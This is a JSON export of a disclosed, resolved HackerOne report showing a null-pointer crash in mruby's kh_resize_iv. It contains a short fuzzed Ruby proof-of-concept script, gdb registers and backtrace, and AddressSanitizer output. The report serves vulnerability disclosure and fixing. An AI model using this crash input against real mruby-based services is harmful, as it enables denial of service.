{
  "id": 193724,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTM3MjQ=",
  "url": "https://hackerone.com/reports/193724",
  "title": "SIGSEGV - kh_resize_iv - Null Deref",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2016-12-24T00:36:15.510Z",
  "submitted_at": "2016-12-24T00:36:15.510Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ston3",
    "url": "/ston3",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-03-09T01:26:43.647Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2017-02-07T01:26:33.509Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "PoC\n---------------------\n\nThe following code triggers the bug (attached as kh_resize_iv.rb):\n\n\t\t\n\n\tl()\n\n\tt('','')do()end\n\n\ts('','')do([].())end\n\n\n\n\t[]*()\n\td\n\n\tt('')do([].())end\n\n\ta=Array.new\n\n\ta.[]=(102,0)\n\t€\n\ts\n\n\ta.to_s\n\ta\n\n\n\n\n\ta.to_s\n\ta.i\n\nDebug - mirb\n---------------------\n\n\t(gdb) r kh_resize_iv.rb \n\tStarting program: /home/x/Desktop/research/mruby/bin/mirb kh_resize_iv.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t => nil\n\t => nil\n\t(mirb):3: undefined method 'l' for main (NoMethodError)\n\t => nil\n\t(mirb):5: undefined method 't' for main (NoMethodError)\n\t => nil\n\t(mirb):7: undefined method 's' for main (NoMethodError)\n\t => nil\n\t => nil\n\t => nil\n\t(mirb):11: can't convert nil into Integer (TypeError)\n\t(mirb):12: undefined method 'd' for main (NoMethodError)\n\t => nil\n\t(mirb):14: undefined method 't' for main (NoMethodError)\n\t => nil\n\t => []\n\t => nil\n\t => 0\n\t(mirb):19: undefined method '�' for main (NoMethodError)\n\t(mirb):20: undefined method 's' for main (NoMethodError)\n\t => nil\n\t => \"[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]\"\n\t => [nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]\n\t => nil\n\t => nil\n\t => nil\n\t => nil\n\t => \"[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]\"\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x00000000004146a4 in kh_resize_iv (mrb=<optimized out>, h=<optimized out>, new_n_buckets=<optimized out>) at /home/x/Desktop/research/mruby/src/variable.c:292\n\t292\tKHASH_DEFINE(iv, mrb_sym, mrb_value, TRUE, kh_int_hash_func, kh_int_hash_equal)\n\t(gdb) info reg\n\trax            0x0\t0\n\trbx            0x0\t0\n\trcx            0x3\t3\n\trdx            0x7de9c0\t8251840\n\trsi            0xaa\t170\n\trdi            0x7de8d0\t8251600\n\trbp            0xfffffffffffffffc\t0xfffffffffffffffc\n\trsp            0x7fffffffbec0\t0x7fffffffbec0\n\tr8             0xfffffffffffffffc\t-4\n\tr9             0x7ffff7acd7b8\t140737348687800\n\tr10            0x7ffff7acd7b8\t140737348687800\n\tr11            0x7ffff7acd701\t140737348687617\n\tr12            0x7fffffffbee0\t140737488338656\n\tr13            0x101\t257\n\tr14            0x0\t0\n\tr15            0x4\t4\n\trip            0x4146a4\t0x4146a4 <kh_resize_iv+388>\n\teflags         0x10246\t[ PF ZF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\nBacktrace - mirb\n---------------------\n\n\t(gdb) bt\n\t#0  0x00000000004146a4 in kh_resize_iv (mrb=<optimized out>, h=<optimized out>, new_n_buckets=<optimized out>) at /home/x/Desktop/research/mruby/src/variable.c:292\n\t#1  0x0000000000414817 in kh_put_iv (mrb=0x7de8d0, h=0x7ab530, key=107, ret=0x0) at /home/x/Desktop/research/mruby/src/variable.c:292\n\t#2  0x00000000004157ed in iv_put (mrb=0x756010, t=0x7ab530, sym=107, val=...) at /home/x/Desktop/research/mruby/src/variable.c:310\n\t#3  mrb_obj_iv_set (mrb=0x756010, obj=0x7ab560, sym=107, v=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/variable.c:499\n\t#4  0x00000000004eb99f in exc_set_backtrace (mrb=0x756010, exc=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/error.c:209\n\t#5  0x00000000004050ae in mrb_funcall_with_block (mrb=<optimized out>, self=..., mid=<optimized out>, argc=<optimized out>, argv=<optimized out>, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:415\n\t#6  0x000000000040403a in mrb_funcall_argv (mrb=0x756010, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>, mid=<optimized out>, argc=1, \n\t    argv=0x7ffff7acd7b8 <main_arena+88>) at /home/x/Desktop/research/mruby/src/vm.c:432\n\t#7  mrb_funcall (mrb=<optimized out>, self=..., name=<optimized out>, argc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:323\n\t#8  0x00000000004e9868 in set_backtrace (mrb=0x756010, info=<error reading variable: access outside bounds of object referenced via synthetic pointer>, bt=...) at /home/x/Desktop/research/mruby/src/error.c:244\n\t#9  mrb_exc_set (mrb=0x756010, exc=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/error.c:271\n\t#10 0x00000000004e9a62 in mrb_exc_raise (mrb=0x756010, exc=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/error.c:290\n\t#11 0x00000000004eae59 in mrb_no_method_error (mrb=0x756010, id=329, args=..., fmt=<optimized out>) at /home/x/Desktop/research/mruby/src/error.c:513\n\t#12 0x0000000000457f59 in mrb_method_missing (mrb=0x756010, name=329, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>, args=...)\n\t    at /home/x/Desktop/research/mruby/src/class.c:1477\n\t#13 0x000000000045ad12 in mrb_bob_missing (mrb=0x756010, mod=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/class.c:1522\n\t#14 0x000000000040a37d in mrb_vm_exec (mrb=<optimized out>, proc=0x7ffff7acd7b8 <main_arena+88>, pc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:1171\n\t#15 0x0000000000402e68 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nClang - mirb\n---------------------\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ./mirb kh_resize_iv.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t => nil\n\t => nil\n\t(mirb):3: undefined method 'l' for main (NoMethodError)\n\t => nil\n\t(mirb):5: undefined method 't' for main (NoMethodError)\n\t => nil\n\t(mirb):7: undefined method 's' for main (NoMethodError)\n\t => nil\n\t => nil\n\t => nil\n\t(mirb):11: can't convert nil into Integer (TypeError)\n\t(mirb):12: undefined method 'd' for main (NoMethodError)\n\t => nil\n\t(mirb):14: undefined method 't' for main (NoMethodError)\n\t => nil\n\t => []\n\t => nil\n\t => 0\n\t(mirb):19: undefined method '�' for main (NoMethodError)\n\t(mirb):20: undefined method 's' for main (NoMethodError)\n\t => nil\n\t => \"[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]\"\n\t => [nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]\n\t => nil\n\t => nil\n\t => nil\n\t => nil\n\t => \"[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]\"\n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==22025==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000052fe21 bp 0x7fff47809480 sp 0x7fff478092a0 T0)\n\t    #0 0x52fe20  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x52fe20)\n\t    #1 0x5301d1  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x5301d1)\n\t    #2 0x533655  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x533655)\n\t    #3 0x532ff2  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x532ff2)\n\t    #4 0x533e71  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x533e71)\n\t    #5 0x6b879c  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6b879c)\n\t    #6 0x4f9a94  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f9a94)\n\t    #7 0x4f76ac  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f76ac)\n\t    #8 0x4f71b5  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f71b5)\n\t    #9 0x6ac314  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6ac314)\n\t    #10 0x6ab1fb  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6ab1fb)\n\t    #11 0x6aca29  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6aca29)\n\t    #12 0x6b3556  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6b3556)\n\t    #13 0x61688f  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x61688f)\n\t    #14 0x61d77b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x61d77b)\n\t    #15 0x50b14c  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x50b14c)\n\t    #16 0x501d5b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x501d5b)\n\t    #17 0x4f3ef8  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f3ef8)\n\t    #18 0x7f8701d58ec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n\t    #19 0x41a595  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mirb+0x52fe20) \n\t==22025==ABORTING\n\nImpact\n---------------------\n\nThis vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.",
  "weakness": {
    "id": 48,
    "name": "Uncontrolled Resource Consumption"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 146762,
      "file_name": "kh_resize_iv.rb",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/146/762/31088680c9b4f1a3d992778c734d6ba07650868c/kh_resize_iv.rb?response-content-disposition=attachment%3B%20filename%3D%22kh_resize_iv.rb%22%3B%20filename%2A%3DUTF-8%27%27kh_resize_iv.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU6ESQMEE%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T232429Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC4TIuyG4oEIFOm3SUTvK%2B3ZK1Qzkw5vPZpFQ2eEhdxPAIhALpmL%2BplVbuOVRoV2k3HfZPlAbkKrVV0RRY4%2F6pmgzUQKrIFCB4QAxoMMDEzNjE5Mjc0ODQ5IgwxRjHx2cOSB574QQsqjwVvzwimbZTEd4O%2FrcNl%2FSD3H5XXqpviY3JfCvonbNQyPo2HR%2BdrW0ZhOetnVHY2aphxRgvSbcGZyKOecYooapl6l4VKS1YUCTDGqc%2BXR06xzFKHNSLYcIrUU3UkNUqmgWZ8X0LLwKu4Sx6txTTGBcy49iQH%2BgKb24uvFbz6%2BoCtGD0mFCgxDcCfPXfkoqstgJeT55VArgWDPtAM68z2nCv8C%2F7KzjDBfnCtjqGJLczfxoNATy0DL2f0DqBKMMcQ8R15tvakucd8JUgp0vVyN7lRLIm3bJ37%2Fe3K7wPZJ%2BXW1thxdqAWuQkZC6wQIvS%2FZS1YcFZ0eL6PkrLRMsWZcSuo3Cdv8G2Sj1YuegU%2BN95CUSvsxEQo1zqeKUxzlN7%2BR0RRGk7qfqOef7LZAbWpU7foPaVK%2FxEfXsTgXVmUFdYOi3cqYyBTBU4liADHzCWhC0pOdBDyXKlGjFd6zmXQ7gNgEOMgYWvLBO0hUJM0zx8sr23pudAmAIKl6Nr4Z1DCyw1Zm6oVGxxaK8HWTmCWsAPBe4PfgG2HvNYNWUKlTAD753QYN8HIXi26qcoGmJlI2zd7KFNCkOGQ4M%2BnhRfmPBVrxtu0RbT8Nh6Pzd4UxOA7ttexvmJp4F8%2BhlzwQqmorBiDS5gK7AHbKqPH0TsaJ16wRtNZOtyAmZEFxEwMi90kq98FGXX91EbNObq%2BAOvg9lRASl%2FZs1jRprMvQTsQFxvJYlnYQvlL87w3%2B9oeQUKAHV0kJ4pR1K9MPtYICWWya%2B%2Blxy0FOjSGUTm4BHpJoFdi1RcegvL1VKrx%2BlWqcXYf1frs2dKG7GkSvLM6f5VXQxcdQOpXoZkTQPUD7xSXiI1m8Eh%2BbeTVwtDqX1sQ0tcGMNbVwcYGOrABvFQh0ck7xMikFaf354iMwrKTPzmn%2BHwyLdye6RarruEilECwhqeNyksYGG06%2FMbb2Y3a65jazA5Ql6rp4NmWmIavGwfThDQww4gAxxA2g7r9N%2F7RQ3dikjYjTkCu%2FAhFXYOZI1liBoND2M9v8y%2BTW3II8tW0sy5GWnnRCpyAyvkgqb9hm%2BvS86cj8Yi%2Fy3VBv7c8Svh5TFXW7i9smhy5%2B5oI5bxHrroK0wGMRGAXscQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0c74916c985c9d6975faf5438783f674c4a7f81d24658a40fd34358bf89c725d",
      "file_size": 130,
      "type": "text/plain",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2017-03-09T01:26:33.556Z",
  "allow_singular_disclosure_after": -269474276.2111626,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "apapedulimu",
    "eveeez",
    "spetr0x",
    "kahraba"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
